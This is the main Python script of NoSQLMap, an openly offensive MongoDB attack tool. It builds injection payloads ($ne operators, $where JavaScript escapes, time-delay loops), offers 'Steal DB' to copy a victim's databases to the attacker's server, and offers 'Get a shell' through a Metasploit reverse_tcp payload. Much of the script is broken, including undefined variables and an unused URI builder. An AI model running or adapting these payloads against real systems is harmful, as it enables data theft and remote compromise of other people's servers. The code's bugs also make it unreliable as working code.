#!/usr/bin/python
# -*- coding: UTF-8 -*-

#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.



import sys
import string
import random
import os
import time
import httplib2
import urllib
import pymongo
import subprocess
from lib.options import Options
from lib.exceptions import MongoConnectionError,MinParametersViolation,ConnectionError
import lib.connections as connections
from lib.log import Logger
import lib.metasploit as metasploit
import lib.HTTPconnections as HTTPconnections
TEST=False

options=Options()

if TEST:
    import testing
    testing.testUnit()

#Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
# global optionSet
# optionSet = [False,False,False,False,False,False]
    # global victim
    # global webPort
    # global uri
    # global httpMethod
    # global myIP
    # global myPort


def mainMenu():
    select = True
    while select:
        os.system('clear')
        print "NoSQLMap v0.2DEV-nosqlmap@gmail.com"
        print "\n"
        print "1-Set options (do this first)"
        print "2-NoSQL DB Access Attacks"
        print "3-NoSQL Web App attacks"
        print "4-Exit"

        select = raw_input("Select an option:")

        if select == "1":
            options.setInteractiveOptions()

        elif select == "2":
            if options.minRequirementsForNetAttack():
                netAttacks()

            #Check minimum required options
            else:
                raw_input("Target not set! Check options.  Press enter to continue...")

        elif select == "3":
            #Check minimum required options
            if options.minRequirementsForWebApps():
                webApps()

            else:
                raw_input("Options not set! Check Host and URI path.  Press enter to continue...")

        elif select == "4":
            sys.exit()

        else:
            raw_input("Invalid Selection.  Press enter to continue.")



def netAttacks():
    '''min necessary: a target'''
    mgtOpen = False
    webOpen = False
    #This is a global for future use with other modules; may change
    global dbList
    #NOTE target === VICTIM
    options.setOptionsRemoteMongo() 
    try:
        conn=connections.MongoConnection(options)
    except MongoConnectionError:
        Logger.error("Error connecting to remote MongoDB server.")
    except MinParametersViolation:
        Logger.error("Missing parameters. Please check options.")
        return
#   srvNeedCreds = raw_input("Does the database server need credentials? ")
    
#   if srvNeedCreds == "n" or srvNeedCreds == "N":
        
#       try:
#           conn = pymongo.MongoClient(target,27017)
#           print "MongoDB port open on " + target + ":27017!"
#           mgtOpen = True
    
#       except:#raise ConnectionFailure in case there is no available port, TypeError if port is not an int
#           print "MongoDB port closed."
    
#   elif srvNeedCreds == "y" or srvNeedCreds == "Y":
#       srvUser = raw_input("Enter server username: ")
#       srvPass = raw_input("Enter server password: ")
#       uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"
#
#       try:
#           conn = pymongo.MongoClient(uri)
 #           print "MongoDB authenticated on " + target + ":27017!"
  #          mgtOpen = True
#        except:
#           print "something happened."
#           mainMenu()
    
    #REST web interface for mongo
#    mgtUrl = "http://" + target + ":28017"
#    try:        
#        #Future rev:  Add web management interface parsing
#        mgtRespCode = urllib.urlopen(mgtUrl).getcode()
#        if mgtRespCode == 200:
#            print "MongoDB web management open at " + mgtUrl + ".  Check this out!"

#        else:
#            print "Got HTTP " + mgtRespCode + "from " + mgtUrl + "."
#    except:
#        print "MongoDB web management closed."
    try:
        webc = connections.WebConnection(options)
    except MinParametersViolation:
        Logger.error("Missing parameters. Please check options.")
#   if mgtOpen == True:
        #Ths is compiling server info?????
    serverInfo = conn.getServerInfo()
    Logger.success("Server Info:"+serverInfo)

    dbList = conn.getDbList()
    Logger.success("List of databases:"+dbList)

    #TODO: restructure this part, with a menu?

    menu="Direct Access to DB completed:\n"
    menu+="1-Steal DB\n"
    menu+="2-Get a shell\n"
    menu+="\n"

    choice = 0
    while choice not in ["1","2"]:
        choice = Logger.logRequest(menu)
        if choice=="1":
            try:
                conn.stealDBs(options)
            except MinParametersViolation:
                Logger.error("Missing parameters. Please check options.")
        elif choice=="2":
            try:
                metasploit.metasploitMongoShell(options)
            except MinParametersViolation:
                Logger.error("Parameters missing, check options")
        else:
            Logger.error("Invalid choice\n")
#            try:
                #TODO: check myIP and myPort are set before calling it
#                proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(target) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)

#            except:
#                print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."

    raw_input("Press enter to continue...")
    return()



def webApps():
    paramName = []
    paramValue = []
    vulnAddrs = []
    possAddrs = []
    appUp = False
    strTbAttack = False
    intTbAttack = False

    
    victim = options.victim
    webPort = options.webPort
    uri = options.uri

    #Verify app is working.
#    print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."

    
#    appURL = "http://%s:%s%s"%(victim, webPort, uri)

    conn = HTTPconnections.ConnectionManager(options)

    try:

        res = conn.testConnection()
        appRespCode=res.status_code
        
        #NOTE: it's better to delay timing test to the second request, because of cache servers etc
        #appRespCode = urllib.urlopen(appURL).getcode()
        if appRespCode == 200:
         #   normLength = int(len(urllib.urlopen(appURL).read()))
        #    timeReq = urllib.urlopen(appURL)
        #    start = time.time()
        #    page = timeReq.read()
        #    end = time.time()
        #    timeReq.close()
        #    timeBase = round((end - start), 3)
#            appUrl=res.url
            m="App is up! Starting injection test.\n"
            Logger.success(m)
        else:
            m = "Page returned HTTP error code %s, please check options" %(appRespCode)
            Logger.error(m)
            return
    except ConnectionError:
        Logger.error("Looks like the server didn't respond.  Check your options.")
        return
    #if appUp == True:


#DIVISION OF INJECTIONS ACCORDING TO THEIR TYPE    



#    injectSize = raw_input("Baseline test-Enter random string size: ")
#    injectString = injStrings.randInjString(int(injectSize))
#    print "Using " + injectString + " for injection testing.\n"

    #Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
    #Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
#    randomUri = buildUri(appURL,injectString)
#    print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
#    randLength = int(len(urllib.urlopen(randomUri).read()))
#    print "Got response length of " + str(randLength) + "."

#    randNormDelta = abs(normLength - randLength)

#    if randNormDelta == 0:
#        print "No change in response size injecting a random parameter..\n"
#    else:
#        print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter value!\n"





#    print "Testing Mongo PHP not equals associative array injection using " + neqUri +"..."
#    injLen = int(len(urllib.urlopen(neqUri).read()))
#    print "Got response length of " + str(injLen) + "."
#
#    randInjDelta = abs(injLen - randLength)
#
#    if (randInjDelta >= 100) and (injLen != 0) :
#        print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
#        vulnAddrs.append(neqUri)
#
#    elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
#        print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
#        possAddrs.append(neqUri)
#
#    elif (randInjDelta == 0):
#        print "Random string response size and not equals injection were the same. Injection did not work."
#    else:
#        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
#        possAddrs.append(neqUri)






    print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
    print "Injecting " + whereStrUri

    whereStrLen = int(len(urllib.urlopen(whereStrUri).read()))
    whereStrDelta = abs(whereStrLen - randLength)

    if (whereStrDelta >= 100) and (whereStrLen > 0):
        print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
        vulnAddrs.append(whereStrUri)

    elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
        print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
        possAddrs.append(whereStrUri)

    elif (whereStrDelta == 0):
        print "Random string response size and $where injection were the same. Injection did not work."

    else:
        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
        possAddrs.append(whereStrUri)
    print "\n"
    print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
    print "Injecting " + whereIntUri

    whereIntLen = int(len(urllib.urlopen(whereIntUri).read()))
    whereIntDelta = abs(whereIntLen - randLength)

    if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
        print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
        vulnAddrs.append(whereIntUri)

    elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
        print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
        possAddrs.append(whereIntUri)

    elif (whereIntDelta == 0):
        print "Random string response size and $where injection were the same. Injection did not work."

    else:
        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
        possAddrs.append(whereIntUri)





    #Start a single record attack in case the app expects only one record back

    print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
    print " Injecting " + whereOneStr

    whereOneStrLen = int(len(urllib.urlopen(whereOneStr).read()))
    whereOneStrDelta = abs(whereOneStrLen - randLength)

    if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
        print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
        vulnAddrs.append(whereOneStr)

    elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
        print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
        possAddrs.append(whereOneStr)

    elif (whereOneStrDelta == 0):
        print "Random string response size and $where single injection were the same. Injection did not work."

    else:
        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
        possAddrs.append(whereOneStr)
    print "\n"
    print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
    print " Injecting " + whereOneInt


    whereOneIntLen = int(len(urllib.urlopen(whereOneInt).read()))
    whereOneIntDelta = abs(whereOneIntLen - randLength)

    if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
        print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
        vulnAddrs.append(whereOneInt)

    elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
        print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
        possAddrs.append(whereOneInt)

    elif (whereOneIntDelta == 0):
        print "Random string response size and $where single record injection were the same. Injection did not work."

    else:
        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
        possAddrs.append(whereOneInt)








    print "\n"
    print "Testing Mongo this not equals string escape attack for all records..."
    print " Injecting " + strThisNeqUri

    whereThisStrLen = int(len(urllib.urlopen(strThisNeqUri).read()))
    whereThisStrDelta = abs(whereThisStrLen - randLength)

    if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
        print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
        vulnAddrs.append(strThisNeqUri)

    elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
        print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
        possAddrs.append(strThisNeqUri)

    elif (WhereThisStrDelta == 0):
        print "Random string response size and this return response size were the same. Injection did not work."

    else:
        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
        possAddrs.append(strThisNeqUri)
    print "Testing Mongo this not equals integer escape attack for all records..."
    print " Injecting " + intThisNeqUri

    whereThisIntLen = int(len(urllib.urlopen(intThisNeqUri).read()))
    whereThisIntDelta = abs(whereThisIntLen - randLength)

    if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
        print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
        vulnAddrs.append(intThisNeqUri)

    elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
        print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
        possAddrs.append(intThisNeqUri)

    elif (whereThisIntDelta == 0):
        print "Random string response size and this return response size were the same. Injection did not work."

    else:
        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
        possAddrs.append(intThisNeqUri)







    doTimeAttack = raw_input("Start timing based tests?")

    if doTimeAttack == "y" or doTimeAttack == "Y":
        print "Starting Javascript string escape time based injection..."
        start = time.time()
        strTimeInj = urllib.urlopen(timeStrUri)
        page = strTimeInj.read()
        end = time.time()
        strTimeInj.close()
        #print str(end)
        #print str(start)
        strTimeDelta = (int(round((end - start), 3)) - timeBase)
        #print str(strTimeDelta)
        if strTimeDelta > 25:
            print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
            strTbAttack = True

        else:
            print "HTTP load time variance was only " + str(strTimeDelta) + ".  Injection probably didn't work."
            strTbAttack = False

        print "Starting Javascript integer escape time based injection..."
        start = time.time()
        intTimeInj = urllib.urlopen(timeIntUri)
        page = intTimeInj.read()
        end = time.time()
        intTimeInj.close()
        #print str(end)
        #print str(start)
        intTimeDelta = (int(round((end - start), 3)) - timeBase)
        #print str(strTimeDelta)
        if intTimeDelta > 25:
            print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
            intTbAttack = True

        else:
            print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
            intTbAttack = False





    print "\n"
    print "Vunerable URLs:"
    print "\n".join(vulnAddrs)
    print "\n"
    print "Possibly vulnerable URLs:"
    print"\n".join(possAddrs)
    print "\n"
    print "Timing based attacks:"

    if strTbAttack == True:
        print "String attack-Successful"
    else:
        print "String attack-Unsuccessful"
    if intTbAttack == True:
        print "Integer attack-Successful"
    else:
        print "Integer attack-Unsuccessful"

    fileOut = raw_input("Save results to file?")

    if fileOut == "y" or fileOut == "Y":
        savePath = raw_input("Enter output file name: ")
        fo = open(savePath, "wb")
        fo.write ("Vulnerable URLs:\n")
        fo.write("\n".join(vulnAddrs))
        fo.write("\n\n")
        fo.write("Possibly Vulnerable URLs:\n")
        fo.write("\n".join(possAddrs))
        fo.write("\n")
        fo.write("Timing based attacks:\n")

        if strTbAttack == True:
            fo.write("String Attack-Successful\n")
        else:
            fo.write("String Attack-Unsuccessful\n")
        fo.write("\n")

        if intTbAttack == True:
            fo.write("Integer attack-Successful\n")
        else:
            fo.write("Integer attack-Unsuccessful\n")
        fo.write("\n")
        fo.close()

    raw_input("Press enter to continue...")

#def randInjString(size):
#    print "What format should the random string take?"
#    print "1-Alphanumeric"
#    print "2-Letters only"
#    print "3-Numbers only"
#    print "4-Email address"
#    format = raw_input("Select an option: ")
#
#    if format == "1":
#        chars = string.ascii_letters + string.digits
#        return ''.join(random.choice(chars) for x in range(size))
#
#    elif format == "2":
#        chars = string.ascii_letters
#        return ''.join(random.choice(chars) for x in range(size))
#
#    elif format == "3":
#        chars = string.digits
#        return ''.join(random.choice(chars) for x in range(size))
#
#    elif format == "4":
#        chars = string.ascii_letters + string.digits
#        return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'



#TODO: THIS FUNCTION NEEDS SOME HEAVY REFACTORING!!

def buildUri(origUri, randValue):
    paramName = []
    paramValue = []
    global neqUri
    global whereStrUri
    global whereIntUri
    global whereOneStr
    global whereOneInt
    global timeStrUri
    global timeIntUri
    global strThisNeqUri
    global intThisNeqUri
    injOpt = ""

    #Split the string between the path and parameters, and then split each parameter
    split_uri = origUri.split("?")
    params = split_uri[1].split("&")

    for item in params:
        index = item.find("=")
        paramName.append(item[0:index])
        paramValue.append(item[index + 1:len(item)])

    menuItem = 1
    print "List of parameters:"
    for params in paramName:
        print str(menuItem) + "-" + params
        menuItem += 1



    try:
        injIndex = raw_input("Which parameter should we inject? ")
        injOpt = str(paramName[int(injIndex)-1])
        print "Injecting the " + injOpt + " parameter..."
    except:
        raw_input("Something went wrong.  Press enter to return to the main menu...")
        mainMenu()

    evilUri = split_uri[0] + "?"
    neqUri = split_uri[0] + "?"
    whereStrUri = split_uri[0] + "?"
    whereIntUri = split_uri[0] + "?"
    whereOneStr = split_uri[0] + "?"
    whereOneInt = split_uri[0] + "?"
    timeStrUri = split_uri[0] + "?"
    timeIntUri = split_uri[0] + "?"
    strThisNeqUri = split_uri[0] + "?"
    intThisNeqUri = split_uri[0] + "?"
    x = 0

    for item in paramName:
        if paramName[x] == injOpt:
            evilUri += paramName[x] + "=" + randValue + "&"
            neqUri += paramName[x] + "[$ne]=" + randValue + "&"
            whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
            whereIntUri += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
            whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
            whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
            timeStrUri  += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
            timeIntUri  += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
            strThisNeqUri += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
            intThisNeqUri += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"

        else:
            evilUri += paramName[x] + "=" + paramValue[x] + "&"
            neqUri += paramName[x] + "=" + paramValue[x] + "&"
            whereStrUri += paramName[x] + "=" + paramValue[x] + "&"
            whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
            whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
            whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
            timeStrUri += paramName[x] + "=" + paramValue[x] + "&"
            timeIntUri += paramName[x] + "=" + paramValue[x] + "&"
            strThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
            intThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
        x += 1

    #Clip the extra & off the end of the URL
    evilUri = evilUri[:-1]
    neqUri = neqUri[:-1]
    whereStrUri = whereStrUri[:-1]
    whereIntUri = whereIntUri[:-1]
    whereOneStr = whereOneStr[:-1]
    whereOneInt = whereOneInt[:-1]
    timeStrUri = timeStrUri[:-1]
    timeIntUri = timeIntUri[:-1]

    return evilUri

#def stealDBs():
#    menuItem = 1
#
#    myDB = options.myIP
#    victim = options.victim
#
#    for dbName in dbList:
#        print str(menuItem) + "-" + dbName
#        menuItem += 1
#
#        dbLoot = raw_input("Select a database to steal:")
#
#    except:
#        print "Invalid selection."
#
#    try:
#        #Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
#
#        dbNeedCreds = raw_input("Does this database require credentials? ")
#        
#        if dbNeedCreds == "n" or dbNeedCreds == "N":    
#            myDBConn = pymongo.MongoClient(myDB,27017)
#            myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)  
#        
#        elif dbNeedCreds == "y" or dbNeedCreds == "Y":
#            dbUser = raw_input("Enter database username: ")
#            dbPass = raw_input("Enter database password: ")
#            myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
#        
#        else:
#            raw_input("Invalid Selection.  Press enter to continue.")
#            stealDBs(myDB)
#            
#        cloneAnother = raw_input("Database cloned.  Copy another?")
#
#        if cloneAnother == "y" or cloneAnother == "Y":
#            stealDBs()
#
#        else:
#            return()
#
#    except:
#        raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
#
#        mainMenu()                              

if "-a" in sys.argv:
    #automatic, just for testing purposes
    #TODO: for automatization of testing
    options.victim = "192.168.178.166" 
    options.webPort = 80 
    options.uri = ""
    options.httpMethod = 1
    options.myIP =  "192.168.178.1"
    options.myPort = 27017
    netAttacks()

mainMenu()





